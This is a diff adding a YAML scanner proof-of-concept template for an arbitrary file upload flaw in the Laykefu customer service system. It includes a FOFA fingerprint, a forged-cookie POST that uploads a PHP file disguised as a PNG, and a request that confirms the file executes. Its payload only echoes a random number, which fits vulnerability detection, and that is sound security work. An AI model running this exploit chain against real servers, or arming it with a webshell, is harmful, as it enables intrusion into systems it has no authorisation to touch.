@@ -1,0 +1,41 @@
+id: poc-yaml-laykefu-anyfile-upload
+info:
+  name: Laykefu客服系统 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: Laykefu客服系统
+  fofa: icon_hash="-334624619"
+variables:
+  t1: random_int(1000,10000)
+requests:
+- method: POST
+  path: /admin/users/upavatar.html
+  headers:
+    X-Requested-With: XMLHttpRequest
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
+    Cookie: user_name=1; user_id=3
+  data: '------WebKitFormBoundary3OCVBiwBVsNuB2kR
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/png
+
+
+    <?php echo {{.t1}};?>
+
+    ------WebKitFormBoundary3OCVBiwBVsNuB2kR--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"msg\":\"ok\"") &&
+
+    contains(content_type,"application/json")
+
+    '
+  output:
+  - regex_match(body,"(?P<time>[0-9]{8})")
+  - regex_match(body,"(?P<file>[0-9a-z]{32})")
+- method: GET
+  path: /uploads/{{.time}}/{{.file}}.php
+  expression: status_code == 200 && body == t1
+transport: http
